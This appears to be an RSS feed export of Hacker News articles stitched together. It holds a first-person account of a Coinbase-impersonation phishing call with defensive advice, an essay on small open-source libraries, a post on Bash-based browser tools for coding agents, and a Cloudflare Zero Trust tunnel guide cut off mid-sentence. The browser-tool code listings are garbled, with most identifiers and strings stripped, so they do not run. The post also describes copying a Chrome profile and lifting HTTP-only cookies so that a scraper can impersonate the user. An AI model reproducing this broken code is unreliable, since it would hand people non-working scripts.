activity on your account. A fraud prevention representative will be in touch shortly..."The email even included what appeared to be a verification code (96841) and assigned me a specific case agent ("Sarah Schueler"). This level of detail gave it tremendous credibility.The Critical Red Flag: Amazon SESBut when I examined the email headers more carefully, I found something suspicious. Here are the key header fields from the phishing email:From: Coinbase Commerce <commerce@coinbase.com>

                    The email was sent through Amazon SES (Simple Email Service), not Coinbase's own mail servers. Here's what made this suspicious: The return path used @amazonses.com, not @coinbase.com The Message-ID clearly shows @email.amazonses.com as the origin While both amazonses.com and coinbase.com DKIM checks passed, this is exactly how phishing works—attackers can configure Amazon SES to send "from" coinbase.comSPF pass for wrong domain: SPF validated that Amazon SES was authorized to send for amazonses.com, not that it was authorized to send as coinbase.comWhile Coinbase might legitimately use Amazon SES for some emails, a security-critical fraud alert should come through more controlled channels with stronger sender verification. The dual DKIM setup is a classic technique: attackers register with Amazon SES, configure it to "send as" the target domain (which Amazon allows), and rely on recipients not checking the actual sending infrastructure.The Phone Call: Even More Convincing (And Recorded)When the woman called me, she was professional, intelligent, and sounded exactly like a legitimate customer service representative. She had all the personal information I'd already mentioned, plus more details that seemed impossible for a scammer to possess.During our conversation, I asked her to authenticate herself. Here's where things got interesting.How I Detected It Was a ScamDespite the sophistication of the attack, several red flags eventually convinced me this was fraudulent:Red Flag #1: The Authentication ProblemI asked the caller to prove she was from Coinbase. She offered to read me my personal information—but I already knew she had that information. That's not authentication; that's just proving she has stolen data.When I suggested she send me an email from a verified Coinbase address that I could reply to, she claimed she didn't have access to personal email addresses and could only use generic support channels. A fraud prevention specialist without the ability to send verified emails? That didn't add up.Red Flag #2: The Callback IssueWhen I asked if I could call her back, she said I couldn't reach her because she was "in the fraud department." After the call, I tried calling the number back: it was a Google Voice number.Legitimate financial institutions always provide callback numbers that route to their main systems. A Google Voice number is a massive red flag.Red Flag #3: Email Verification ConfusionWhen I challenged the authenticity of the email sender, the caller insisted that Amazon was just Coinbase's "service provider" and that the DKIM signatures proved legitimacy. But when pressed, she couldn't explain away the anomalies in a satisfactory way.The conversation on the recorded call shows my growing skepticism: "I don't think there is enough information provided for me to authenticate you." "I'm not sure what you would like me to do..." "There are just too many red flags."Red Flag #4: No Notifications in My AccountAfter the call, I logged into my actual Coinbase account. There were:No notifications about the alleged transferNo new authorized devicesNo actual transaction matching what the caller describedIf this were real, there would have been notifications everywhere.Red Flag #5: The Pressure to Use Coinbase WalletThe caller wanted me to move my cryptocurrency to "a cold wallet" and started walking me through downloading Coinbase Wallet. This is a classic social engineering tactic—get the victim to move funds to an address controlled by the attacker.I didn't follow through, so I never discovered exactly how they planned to steal the funds, but the intent was clear.Here's where things got even more concerning. Immediately after I ended the call with the scammer, my phone was bombarded with hundreds of text messages—random service signups, verification codes, newsletters, everything imaginable.At first, I thought this was just a vindictive "FU" from the scammer. But the timing and volume suggest something more calculated: SMS flooding is a known technique to hide legitimate security alerts in noise.The attack works like this:Scammer floods your phone with spam textsWhile you're overwhelmed, they attempt account takeovers on various servicesReal 2FA codes and security alerts get buried in the floodYou miss the critical warnings because they're hidden among hundreds of spam messagesThis could have been an attempt to:Hijack my SMS-based two-factor authenticationHide real alerts from Coinbase or other servicesOverwhelm me while they attempted unauthorized access to various accountsCreate confusion and distract from their next movesThis wasn't just a phishing call—it was a coordinated, multi-vector attack.Coinbase's handling of this breach raises serious questions:1. Outsourcing Security-Sensitive RolesCustomer support agents at third-party contractors had access to extremely sensitive data: Social Security numbers, account balances, transaction histories, and personal documents. Why were overseas contractors given such privileged access?The economics of the bribery scheme tell the story: attackers likely paid relatively small amounts to contractors earning modest wages to access data they then used to attempt thefts worth potentially millions.2. Failed Detection SystemsCoinbase claims they "discovered" the breach on May 11, 2025, when attackers attempted to extort $20 million. But my case—and likely many others—proves the breach was being actively exploited months earlier.What monitoring systems failed to detect that customer data was being used in sophisticated phishing attacks? I reported this in January with specific details about how the attacker knew my information. That report should have triggered alarm bells.3. Inadequate Response to User ReportsDespite Brett Farmer's initial acknowledgment that my report was "super robust" and warranted investigation, my follow-up emails asking how attackers obtained my account data went completely unanswered.My question was specific and technical. It went to the heart of what should have been a massive red flag: How did attackers have access to non-public account data?Had Coinbase investigated this seriously in January, they might have discovered the insider threat months earlier and prevented additional victims.4. The Disclosure TimelineCoinbase says they "became aware" of the breach on May 11, 2025. But my January attack proves the breach was active at least four months earlier. This raises uncomfortable questions:When did the actual data exfiltration occur? Late 2024?How many other victims reported similar attacks between January and May?Were those reports properly escalated and investigated?Would Coinbase have disclosed the breach if not for the extortion attempt?Practical Ways to Protect YourselfWhen a major platform gets breached, your personal information may already be in attackers' hands. You can't undo that, but you can still reduce the chances you'll fall for the scams that follow:Phone numbers can be spoofed. Even if the caller ID shows a legitimate company, don't trust it. Always hang up and call back using a number you independently verify (from the company's official website, not from the email or caller). Ask the caller for their callback number, then look up that number online before calling it back. Search for "[phone number] scam" or "[phone number] reviews" to see if others have reported it as fraudulent. In my case, when I called back the number the scammer gave me (1-805-885-0141), it turned out to be a Google Voice number—an instant red flag. Legitimate corporate support lines won't use Google Voice.2. Understand That Scammers May Have Your Personal InfoIn the age of massive data breaches, assume attackers may know:Your name, address, phone number, emailLast 4 digits of your SSNYour account balances and transaction historyOther "secret" information you thought was secureJust because someone knows this information doesn't mean they're legitimate. Authentication needs to work both ways.Learn to check email headers. Look for:The actual sending server (not just the "From" address)SPF, DKIM, and DMARC validation resultsUnusual routing or relay serversIn my case, the Amazon SES sending address was the tip-off, even though DKIM signatures technically validated.One way to sanity-check them: If you're not sure how to interpret email headers, copy the full headers and paste them into a good AI assistant (like ChatGPT or Claude) and ask: "Analyze these email headers and tell me if there are any red flags or signs this could be a phishing email." AI tools are excellent at spotting anomalies in technical data like email routing.4. Demand Proper AuthenticationIf someone calls claiming to be from your bank, exchange, or other financial institution, they should be able to authenticate themselves to you, not just read back information they already have.Legitimate companies can:Send you emails from verified domain addresses you can reply toProvide callback numbers that route through their main systemVerify their identity through the app or website you're already logged into5. Check Your Account DirectlyIf someone alerts you to suspicious activity, don't trust the email or call. Open a browser, type in the company's URL directly (don't click links), log in, and check for yourself. If there's really a problem, it will show up in your account.6. Never Move Funds Under PressureLegitimate companies will never pressure you to immediately move your funds, download software, or take urgent action to "protect" your account. That pressure is the scam.7. Use App-Based or Hardware 2FA, Not SMSMy experience with SMS flooding shows why SMS-based two-factor authentication is vulnerable. Use:Hardware security keys (YubiKey, Titan)Authenticator apps (Google Authenticator, Authy)Platform-specific authentication (like Coinbase's app-based approval)SMS can be hijacked, flooded, or intercepted.If you're targeted by a sophisticated attack, report it immediately and provide as much detail as possible:Specific information the attacker knewRecording of calls if possible (check your local laws)Your report might be the data point that helps the company detect a breach.Why This Four-Month Gap MattersMy case represents just one data point in what appears to be a months-long campaign of attacks enabled by the Coinbase breach. How many other customers were targeted between January and May? How many fell for these scams because they didn't catch the red flags I did?Coinbase has committed to reimbursing customers who were defrauded. But the $180-400 million estimated cost of this breach doesn't just represent reimbursements—it represents the human cost of trust betrayed, security compromised, and warnings ignored.The cryptocurrency industry promises decentralization and security, but incidents like this expose the risks of centralized custody. When you trust an exchange with your assets and personal information, you're trusting their security practices, their contractor oversight, and their incident response capabilities.In this case, that trust was misplaced.Questions Coinbase Still Hasn't AnsweredFour months after my attack, and several months after Coinbase's disclosure, key questions remain:When did the actual breach occur? My January attack suggests late 2024 at the latest.How many customers were targeted before May 2025? Am I one of dozens? Hundreds? Thousands?What happened to the user reports filed between January and May? Were they properly investigated and escalated?Why wasn't the connection made between user reports of sophisticated phishing and a potential data breach?What specific access controls failed that allowed overseas contractors to exfiltrate sensitive data?Will there be regulatory consequences for the delayed disclosure? SEC rules require timely reporting of material cybersecurity incidents.How can users trust that the security improvements Coinbase claims to have made are actually effective?Conclusion: The Timeline MattersThe discrepancy between my January attack and Coinbase's May disclosure isn't just an interesting footnote—it's a critical part of understanding what went wrong and who bears responsibility.My emails, timestamped and documented, prove that:The breach was being actively exploited months before Coinbase's "discovery"A customer reported detailed evidence of the attack and asked specific questions about data compromiseThose questions went unanswered for monthsThe breach was only disclosed after attackers attempted extortionI was one of the lucky ones—I detected the scam and didn't lose funds. But how many others weren't so fortunate during those four months of silence?When I asked the one question that mattered most—how did the attacker have my data?—the company went silent.That silence lasted 120 days.And that's the real story behind the $400 million breach.]]></content:encoded></item><item><title>Open-source Zig book</title><link>https://www.zigbook.net/</link><author>rudedogg</author><category>dev</category><pubDate>Sun, 16 Nov 2025 19:44:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Ready to transform how you think about software?]]></content:encoded></item><item><title>Supercookie: Browser Fingerprinting via Favicon (2021)</title><link>https://github.com/jonasstrehle/supercookie</link><author>vxvrs</author><category>dev</category><pubDate>Sun, 16 Nov 2025 19:39:52 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Dark Pattern Games</title><link>https://www.darkpattern.games/</link><author>robotnikman</author><category>dev</category><pubDate>Sun, 16 Nov 2025 19:38:49 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[: A gaming dark pattern is something that is deliberately added to a game to cause an unwanted negative experience for the player with a positive outcome ]]></content:encoded></item><item><title>The fate of &quot;small&quot; open source</title><link>https://nolanlawson.com/2025/11/16/the-fate-of-small-open-source/</link><author>todsacerdoti</author><category>dev</category><pubDate>Sun, 16 Nov 2025 19:21:13 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[By far the most popular npm package I’ve ever written is , which is ~10 years old and still gets 5+ million weekly downloads.It’s a small collection of utilities for working with s in JavaScript. I wrote it because I found that PouchDB users were endlessly confused about how to work with s and how to convert them to strings, s, etc.Given that some 80% of developers are now using AI in their regular work,  is almost certainly the kind of thing that most developers would just happily have an LLM generate for them. Sure, you  use , but then you’d be taking on an extra dependency, with unknown performance, maintenance, and supply-chain risks.And sure enough, Claude will happily spit out whatever  utilities you need when prompted:> Write me a utility function in TypeScript to convert a Blob to an ArrayBuffer. It should return a Promise.function blobToArrayBuffer(blob: Blob): Promise<ArrayBuffer> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = () => {
      if (reader.result instanceof ArrayBuffer) {
        resolve(reader.result);
      } else {
        reject(new Error('Failed to read Blob as ArrayBuffer'));
      }
    };

    reader.onerror = () => {
      reject(reader.error);
    };

    reader.readAsArrayBuffer(blob);
  });
}
Claude’s version is pretty close to the  version (unsurprising, since it was probably trained on it!). Although it’s much more verbose, unnecessarily checking if  actually gives you an  (although this does make TypeScript happy). To be fair, it also improves on my implementation by directly ing with an error rather than the more awkward  event. for anyone wondering, yes Claude did suggest the new  method, but it also generated the above for “older environments.”I suppose some people would see this as progress: fewer dependencies, more robust code (even if it’s a bit more verbose), quicker turnaround time than the old “search npm, find a package, read the docs, install it” approach.I don’t have any excessive pride in this library, and I don’t particularly care if the download numbers go up or down. But I do think something is lost with the AI approach. When I wrote , I took a teacher’s mentality: the README has a cutesy and whimsical tutorial featuring Kirby, in all his blobby glory. (I had a thing for putting Nintendo characters in all my stuff at the time.)The goal wasn’t just to give you a utility to solve your problem (although it does that) – the goal was also to  people how to use JavaScript effectively, so that you’d have an understanding of how to solve other problems in the future.I don’t know which direction we’re going in with AI (well, ~80% of us; to the remaining holdouts, I salute you and wish you godspeed!), but I do think it’s a future where we prize instant answers over teaching and understanding. There’s less reason to use something like , which means there’s less reason to write it in the first place, and therefore less reason to educate people about the problem space.Even now there’s a movement toward putting documentation in an  file, so you can just point an agent at it and save your brain cells the effort of deciphering English prose. (Is this even documentation anymore? What  documentation?)I still believe in open source, and I’m still doing it (in fits and starts). But one thing has become clear to me: the era of small, low-value libraries like  is over. They were already on their way out thanks to Node.js and the browser taking on more and more of their functionality (see , , etc.), but LLMs are the final nail in the coffin.This does mean that there’s less opportunity to use these libraries as a springboard for user education (Underscore.js also had this philosophy), but maybe that’s okay. If there’s no need to find a library to, say, group the items in an array, then maybe learning about the mechanics of such libraries is unnecessary. Many software developers will argue that asking a candidate to reverse a binary tree is pointless, since it never comes up in the day-to-day job, so maybe the same can be said for utility libraries.I’m still trying to figure out what  of open source are worth writing in this new era (hint: ones that an LLM can’t just spit out on command), and where education is the most lacking. My current thinking is that the most value is in bigger projects, more inventive projects, or in more niche topics not covered in an LLM’s training data. For example, I look back on my work on  and various memory-leak-hunting blog posts, and I’m pretty satisfied that an LLM couldn’t reproduce this, because it requires novel research and creative techniques. (Although who knows: maybe someday an agent will be able to just bang its head against Chrome heap snapshots until it finds the leak. I’ll believe it when I see it.)There’s been a lot of hand-wringing lately about where open source fits in in a world of LLMs, but I still see people pushing the boundaries. For example, a lot of naysayers think there’s no point in writing a new JavaScript framework, since LLMs are so heavily trained on React, but then there goes the indefatigable Dominic Gannaway writing Ripple.js, yet another JavaScript framework (and with some new ideas, to boot!). This is the kind of thing I like to see: humans laughing in the face of the machine, going on with their human thing.So if there’s a conclusion to this meandering blog post (excuse my squishy human brain; I didn’t use an LLM to write this), it’s just that: yes, LLMs have made some kinds of open source obsolete, but there’s still plenty of open source left to write. I’m excited to see what kinds of novel and unexpected things you all come up with.]]></content:encoded></item><item><title>What if you don&apos;t need MCP at all?</title><link>https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/</link><author>jdkee</author><category>dev</category><pubDate>Sun, 16 Nov 2025 18:58:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[After months of agentic coding frenzy, Twitter is still ablaze with discussions about MCP servers. I previously did some very light benchmarking to see if Bash tools or MCP servers are better suited for a specific task. The TL;DR: both can be efficient if you take care.Unfortunately, many of the most popular MCP servers are inefficient for a specific task. They need to cover all bases, which means they provide large numbers of tools with lengthy descriptions, consuming significant context.It's also hard to extend an existing MCP server. You could check out the source and modify it, but then you'd have to understand the codebase, together with your agent.MCP servers also aren't composable. Results returned by an MCP server have to go through the agent's context to be persisted to disk or combined with other results.I'm a simple boy, so I like simple things. Agents can run Bash and write code well. Bash and code are composable. So what's simpler than having your agent just invoke CLI tools and write code? This is nothing new. We've all been doing this since the beginning. I'd just like to convince you that in many situations, you don't need or even want an MCP server.Let me illustrate this with a common MCP server use case: browser dev tools.My Browser DevTools Use CasesMy use cases are working on web frontends together with my agent, or abusing my agent to become a scrapey little hacker boy so I can scrape all the data in the world. For these two use cases, I only need a minimal set of tools:Start the browser, optionally with my default profile so I'm logged inNavigate to a URL, either in the active tab or a new tabExecute JavaScript in the active page contextTake a screenshot of the viewportAnd if my use case requires additional special tooling, I want to quickly have my agent generate that for me and slot it in with the other tools.Problems with Common Browser DevTools for Your AgentPeople will recommend Playwright MCP or Chrome DevTools MCP for the use cases I illustrated above. Both are fine, but they need to cover all the bases. Playwright MCP has 21 tools using 13.7k tokens (6.8% of Claude's context). Chrome DevTools MCP has 26 tools using 18.0k tokens (9.0%). That many tools will confuse your agent, especially when combined with other MCP servers and built-in tools.Using those tools also means you suffer from the composability issue: any output has to go through your agent's context. You can kind of fix this by using sub-agents, but then you rope in all the issues that sub-agents come with.Embracing Bash (and Code)Here's my minimal set of tools, illustrated via the README.md:

Minimal CDP tools for collaborative site exploration.



\\`bash
./start.js              # Fresh profile
./start.js --profile    # Copy your profile (cookies, logins)
\\`

Start Chrome on  with remote debugging.



\\`bash
./nav.js https://example.com
./nav.js https://example.com --new
\\`

Navigate current tab or open new tab.



\\`bash
./eval.js 'document.title'
./eval.js 'document.querySelectorAll("a").length'
\\`

Execute JavaScript in active tab (async context).



\\`bash
./screenshot.js
\\`

Screenshot current viewport, returns temp file path.
This is all I feed to my agent. It's a handful of tools that cover all the bases for my use case. Each tool is a simple Node.js script that uses Puppeteer Core. By reading that README, the agent knows the available tools, when to use them, and how to use them via Bash.When I start a session where the agent needs to interact with a browser, I just tell it to read that file in full and that's all it needs to be effective. Let's walk through their implementations to see how little code this actually is.The agent needs to be able to start a new browser session. For scraping tasks, I often want to use my actual Chrome profile so I'm logged in everywhere. This script either rsyncs my Chrome profile to a temporary folder (Chrome doesn't allow debugging on the default profile), or starts fresh: { spawn, execSync } ;
 puppeteer ;

 useProfile = process.[] === ;

 (process.[] && process.[] !== ) {
    .();
    .();
    .();
    .();
    .();
    .();
    process.();
}

 {
    (, { :  });
}  {}

((r, ));

(, { :  });

 (useProfile) {
    (
        ,
        { :  },
    );
}

(
    ,
    [, ],
    { : , :  },
).();

 connected = ;
 ( i = ; i < ; i++) {
     {
         browser =  puppeteer.({
            : ,
            : ,
        });
         browser.();
        connected = ;
        ;
    }  {
        ((r, ));
    }
}

 (!connected) {
    .();
    process.();
}

.();
All the agent needs to know is to use Bash to run the start.js script, either with  or without.Once the browser is running, the agent needs to navigate to URLs, either in a new tab or the active tab. That's exactly what the navigate tool provides: puppeteer ;

 url = process.[];
 newTab = process.[] === ;

 (!url) {
    .();
    .();
    .();
    .();
    process.();
}

 b =  puppeteer.({
    : ,
    : ,
});

 (newTab) {
     p =  b.();
     p.(url, { :  });
    .(, url);
}  {
     p = ( b.()).(-);
     p.(url, { :  });
    .(, url);
}

 b.();
The Evaluate JavaScript ToolThe agent needs to execute JavaScript to read and modify the DOM of the active tab. The JavaScript it writes runs in the page context, so it doesn't have to fuck around with Puppeteer itself. All it needs to know is how to write code using the DOM API, and it sure knows how to do that: puppeteer ;

 code = process..().();
 (!code) {
    .();
    .();
    .();
    .();
    process.();
}

 b =  puppeteer.({
    : ,
    : ,
});

 p = ( b.()).(-);

 (!p) {
    .();
    process.();
}

 result =  p.( {
     = ( () => {}).;
    ()();
}, code);

 (.(result)) {
     ( i = ; i < result.; i++) {
         (i > ) .();
         ( [key, value] .(result[i])) {
            .();
        }
    }
}  ( result ===  && result !== ) {
     ( [key, value] .(result)) {
        .();
    }
}  {
    .(result);
}

 b.();
Sometimes the agent needs to have a visual impression of a page, so naturally we want a screenshot tool: { tmpdir } ;
 { join } ;
 puppeteer ;

 b =  puppeteer.({
    : ,
    : ,
});

 p = ( b.()).(-);

 (!p) {
    .();
    process.();
}

 timestamp = ().().(, );
 filename = ;
 filepath = ((), filename);

 p.({ : filepath });

.(filepath);

 b.();
This will take a screenshot of the current viewport of the active tab, write it to a .png file in a temporary directory, and output the file path to the agent, which can then turn around and read it in and use its vision capabilities to "see" the image.So how does this compare to the MCP servers I mentioned above? Well, to start, I can pull in the README whenever I need it and don't pay for it in every session. This is very similar to Anthropic's recently introduced skills capabilities. Except it's even more ad hoc and works with any coding agent. All I need to do is instruct my agent to read the README file.Side note: many folks including myself have used this kind of setup before Anthropic released their skills system. You can see something similar in my "Prompts are Code" blog post or my little sitegeist.ai. Armin has also touched on the power of Bash and code compared to MCPs previously. Anthropic's skills add progressive disclosure (love it) and they make them available to a non-technical audience across almost all their products (also love it).Speaking of the README, instead of pulling in 13,000 to 18,000 tokens like the MCP servers mentioned above, this README has a whopping 225 tokens. This efficiency comes from the fact that models know how to write code and use Bash. I'm conserving context space by relying heavily on their existing knowledge.These simple tools are also composable. Instead of reading the outputs of an invocation into the context, the agent can decide to save them to a file for later processing, either by itself or by code. The agent can also easily chain multiple invocations in a single Bash command.If I find that the output of a tool is not token efficient, I can just change the output format. Something that's hard or impossible to do depending on what MCP server you use.And it's ridiculously easy to add a new tool or modify an existing tool for my needs. Let me illustrate.When the agent and I try to come up with a scraping method for a specific site, it's often more efficient if I'm able to point out DOM elements to it directly by just clicking on them. To make this super easy, I can just build a picker. Here's what I add to the README:

\\`bash
./pick.js "Click the submit button"
\\`

Interactive element picker. Click to select, Cmd/Ctrl+Click for multi-select, Enter to finish.

Whenever I think it's faster for me to just click on a bunch of DOM elements instead of having the agent figure out the DOM structure, I can just tell it to use the pick tool. It's super efficient and allows me to build scrapers in no time. It's also fantastic to adjust the scraper if the DOM layout of a site changed.If you're having trouble following what this tool does, worry not, I will have a video at the end of the blog post where you can see it in action. Before we look at that, let me show you an additional tool.During one of my recent scraping adventures, I had a need for HTTP-only cookies of that site, so the deterministic scraper could pretend it's me. The Evaluate JavaScript tool cannot handle this as it executes in the page context. But it took not even a minute for me to instruct Claude to create that tool, add it to the readme, and away we went.This is so much easier than adjusting, testing, and debugging an existing MCP server.Let me illustrate usage of this set of tools with a contrived example. I set out to build a simple Hacker News scraper where I basically pick the DOM elements for the agent, based on which it can then write a minimal Node.js scraper. Here's how that looks in action. I sped up a few sections where Claude was its usual slow self.Real world scraping tasks would look a bit more involved. Also, there's no point in doing it like this for such a simple site like Hacker News. But you get the idea.Making This Reusable Across AgentsHere's how I've set things up so I can use this with Claude Code and other agents. I have a folder  in my home directory. I then clone the repositories of individual tools, like the browser tools repository above, into that folder. Then I set up an alias: cl=This way all of the scripts are available to sessions of Claude, but don't pollute my normal environment. I also prefix each script with the full tool name, e.g. , to eliminate name collisions. I also add a single sentence to the README telling the agent that all the scripts are globally available. This way, the agent doesn't have to change its working directory just to call a tool script, saving a few tokens here and there, and reducing the chances of the agent getting confused by the constant working directory changes.Finally, I add the agent tools directory as a working directory to Claude Code via , so I can use  to reference a specific tool's README file and get it into the agent's context. I prefer this to Anthropic's skill auto-discovery, which I found to not work reliably in practice. It also means I save a few more tokens: Claude Code injects all the frontmatter of all skills it can find into the system prompt (or first user message, I forgot, see https://cchistory.mariozechner.at)Building these tools is ridiculously easy, gives you all the freedom you need, and makes you, your agent, and your token usage efficient. You can find the browser tools on GitHub.This general principle can apply to any kind of harness that has some kind of code execution environment. Think outside the MCP box and you'll find that this is much more powerful than the more rigid structure you have to follow with MCP.With great power comes great responsibility though. You will have to come up with a structure for how you build and maintain those tools yourself. Anthropic's skill system can be one way to do it, though that's less transferable to other agents. Or you follow my setup above.

I am a full-on Cloudflare Zero Trust with Warp convert, and while I still have Tailscale running in parallel, almost everything I do now is going through Zero Trust tunnels.This post is an explanation of the basic concepts, because I’m sure others will have similar issues wrapping their head around it.Why would you even sink so much time into learning this? What does it give you?Argo tunnels through Zero Trust allow you to do a bunch of  cool things:Connect private networks together - can be home networks, can be kubernetes clusters, you can create tunnels to and from every infraExpose private services to the public, on public hostnames, no matter where they are running. You could even put your router running at 192.168.1.1 on the internet, accessible to everyone, no Warp client requiredCreate fully private networks with private IPs (10.x.x.x) that only resolve when Warp is connected, to services you specifyQuickly expose a public route to any service running locally or on any server, for quick development, testing webhooks or giving coworkers a quick previewCreate a fully private network running at home that’s only available when you’re connected to the Warp VPN client, or only to you, reachable anywhereNo worries about NAT, everything goes through the Cloudflare network, no direct p2p connection requiredAdd very granular access policies on who can access what - what login method does the user need, which email addresses are allowed. Allow bots and server-to-server exceptions with service access tokens.Does the user need to have Warp running? Does he need to be enrolled in Zero Trust? Does he need some special permission flag?Authenticate to SSH servers through Zero Trust access policies without the need of SSH keys. Just connect Warp, type  and you’re logged inClose public SSH ports completely to only allow login through WarpGet the benefits of Cloudflare VPN edge routing on top (similar to 1.1.1.1 Warp+)Quickie: Cloudflare Zero Trust vs Tailscale#To get this out of the way:: peer-to-peer, uses NAT and firewall penetration methods to establish p2p connections. If not possible, it goes through central relay servers. Absolute best speed and latency if a connection is established.: All traffic (with the exception of warp-to-warp routing, which is p2p) goes through Cloudflare’s edge network. So even SSH-ing into your local router will hop through Cloudflare servers. This adds latency, but no issues with NAT at all.Cloudflare has 2 tools available: Warp Client and Cloudflared. They interact with each other and have similarities in some areas but are not the same.The tool that connects you to the Cloudflare network. This is the thing that you configure to add clients into your Zero Trust network and enforces policies.Usually this runs on clients, but can also run on servers.The thing that creates a  and adds it to the Zero Trust network.Most commonly you run this on servers to expose tunnels into your network, but you can also run it on clients.On the client side you can use  to establish a connection with other things in your Zero Trust network.Can also create one-time-use tunnels that aren’t connected to the Zero Trust network. Good for testing.Tunnels, Routes, Targets#This took me the longest to understand. Zero Trust allows you to configure ,  and ; here’s how they interplay.The most important part of your setup. Tunnels are deployed through  and are simply an  for traffic. Think of it as a literal tunnel that has its end somewhere.Tunnels are deployed to infrastructure in the target network. So if you have a home network with 192.168.1.1/24, you want to deploy  on any machine that’s always on and within that network. It can be your router, or your Raspi, it doesn’t matter.For server-hosted services, you can have a tunnel on your main dev server, on a server, or on a pod in your Kubernetes cluster.Now you have an opening into these networks through Warp/Argo tunnels.You can either configure tunnels through the Zero Trust UI by “adopting” them, or configure them in the /etc/cloudflared/config.yml config on the machine itself. Personal preference, I usually configure them on the machine itself.The config specifies where a request should get routed to when it arrives at the tunnel. So the tunnel knows what to do with it.In this config we tell cloudflared to route traffic arriving at this tunnel for hostname  to localhost:80, and  to the local SSH server.❯ cat /etc/cloudflared/config.yml
tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: gitlab.widgetcorp.tech
    service: http://localhost:80
  - hostname: gitlab-ssh.widgetcorp.tech
    service: ssh://localhost:22
  - service: http_status:404

  # Catch-all for WARP routing
  - service: http_status:404

warp-routing:
  enabled: true
The config alone doesn’t do anything. It just exposes a tunnel, and that’s it. What we need now are routes and targets.Exposing a private network to the public with tunnels quickly#Quick addition, as this is a super common use case. If you want to just expose something in your home network to the internet, you can add a config like this:tunnel: a2f17e27-cd4d-4fcd-b02a-63839f57a96f
credentials-file: /etc/cloudflared/a2f17e27-cd4d-4fcd-b02a-63839f57a96f.json
ingress:
  - hostname: homeassistant.mydomain.com
    service: http://192.168.1.3:80
Then go into Cloudflare DNS settings and map the domain homeassistant.mydomain.com to the tunnel:CNAME homeassistant.mydomain.com a2f17e27-cd4d-4fcd-b02a-63839f57a96f.cfargotunnel.comNow all traffic going to this domain will go through the cloudflared tunnel, which is configured to route homeassistant.mydomain.com to . , Argo tunnel does everything for us. If you adopted the tunnels and don’t use , you can automatically create matching DNS records in the Cloudflare UI and don’t need to do this manually.A route defines  to direct traffic to.Let’s say your homeassistant runs on 192.168.1.3 at home and you want to reach it from outside. Just above we deployed a  tunnel on our router at 192.168.1.3, and added a config pointing the domain to the Argo tunnel, so homeassistant.mydomain.com is already available to the public. However,  isn’t, as it’s a private network IP.A route like  pointing at your tunnel, to route  traffic to the full IP range through that tunnel (so even 192.168.1.245 will go through your tunnel)Or a more specific route like  pointing at your tunnel, to  route traffic to 192.168.1.3 through that tunnel.When configured, once your user connects their Warp client that’s set up with your Zero Trust network, the Warp client will see requests to 192.168.1.3 and route it through the Cloudflare network to reach your specific tunnel. Like a little police helper directing cars where to go.If the Warp client is  connected, 192.168.1.3 will just resolve in your current local network. If connected, it will resolve to the tunnel.The routed IP doesn’t need to exist! So you could, for example, route a random IP you like (e.g., 10.128.1.1) to your tunnel, the tunnel then forwards it based on your routes, for example to 192.168.1.1. This is extremely powerful because it allows you to build your own fully virtual network.That’s all it does, what happens afterwards is up to the tunnel config that we created above. The tunnel decides where to point the incoming request to, whether that’s localhost or somewhere else.To summarize, the  tells the Warp client where to route traffic to.Now we have 2 things working:homeassistant.mydomain.com - goes through a Cloudflare DNS record pointing at an Argo tunnel, which then forwards to 192.168.1.3. This works without Warp connected as it’s on the DNS level, public to everyone. - The Warp client sees the request and routes it through the Argo tunnel, which then forwards it to  within that network. This needs Warp connected to work, and is only visible to people in your Zero Trust org.This one took me a while.Targets are needed to define a piece of infrastructure that you want to protect through Zero Trust. They are like a pointer pointing to something in your network. This goes hand-in-hand with routes, but isn’t always needed.Let’s say you have 192.168.1.3 (homeassistant) exposed through a Cloudflare tunnel. By default, anyone in your network that is part of your Zero Trust org and has Warp client installed can now access your homeassistant at 192.168.1.3.We can change that with targets. For example, defining a target with hostname = homeassistant.mydomain.com to the route  allows us to add access policies to it. We can also put an entire network into the target by specifying  to control access. This also works with virtual IPs like 10.128.1.1!Targets alone won’t do anything, they just point to the service or network. “Hey, here is homeassistant”, or “hey, here is my home network”.Access Policies: Protecting Who Can Access What#Continuing the example from above:we have a tunnel running on our home network that routes homeassistant.mydomain.com to we set up public DNS records to point homeassistant.mydomain.com to the Argo tunnel in Cloudflarewe created a  to go through the same tunnelwe also created a  pointing to When users access either  or homeassistant.mydomain.com, the Warp client will route the request through the tunnel, which then forwards the request to 192.168.1.3. Homeassistant loads and everything is fine.Access policies to the rescue!With access policies, we can leave things in the public but protect them with Cloudflare Zero Trust access. So while 192.168.1.3 is only available if Warp is connected (so routing to it works), we can add security to our public homeassistant.mydomain.com.Go to Access -> Applications -> Add an Application -> Self-hosted.Here we can define  should be protected, and .Going with our previous example, we can add a public hostname homeassistant.mydomain.com or an IP like  (or both), then attach policies of who should be able to access it.You can specify  (“OR”) and  (“AND”) selectors. rules must always be met,  of include rules, to grant accessAny of the  rules must match to grant access - when the policy matches, allow access - when the policy matches, deny access. aka blocking something. - when the policy matches, bypass Zero Trust completely. No more checking. - when the policy matches, allow authentication to the service with a service token header (good for server-to-server, or bots). Check Access -> Service Auth to create these tokens.Allow public access to everyone logging into your network#The most common use case: homeassistant.mydomain.com is public. We want to keep it public, but add an extra layer of security.Add an  policy, pick any of the  selectors, add the email of the user you want to allow access to. Now only people authenticated with your Zero Trust org with the specified emails can access your homeassistant, without needing to have Warp running.We can harden this by adding  rules: Add a  selector rule, pick a specific login method like GitHub. Now only people with specific emails that have authenticated through GitHub can access your homeassistant, without needing to have Warp running.Another policy I like having is to skip the login screen entirely when connected through Warp. If a user is already enrolled into my Zero Trust org and has the Warp client provisioned, then there’s no need to ask them to authenticate again.We can add a separate policy (don’t edit the one we just created above), pick the  selector and set it to  or . - the Warp selector will match anyone that has Warp running, including the consumer 1.1.1.1 app. , on the other hand, matches only if someone is connecting through your Gateway, be that DNS or a provisioned Warp client.(The ‘Gateway’ selector is only available if the Warp client is set to allow WARP authentication identity)Warp through Zero 